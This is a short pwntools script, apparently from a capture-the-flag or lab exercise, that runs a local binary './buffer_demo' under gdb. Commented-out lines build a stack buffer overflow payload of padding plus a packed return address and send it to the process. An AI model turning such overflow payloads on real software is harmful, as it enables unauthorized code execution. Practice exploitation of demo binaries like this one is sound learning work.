from pwn import *

# p = process('./buffer_demo')

# payload = b'A' * (0x34 - 0xC)
# payload += b'1'
context.arch = 'i386'
context.terminal = ['urxvt', '-e', 'sh', '-c']

p = gdb.debug('./buffer_demo')
p.interactive()

# payload = b'A' * 0x34
# payload += p32(0x8048517)

# p.sendline(payload)

# p.interactive()
# p.close()
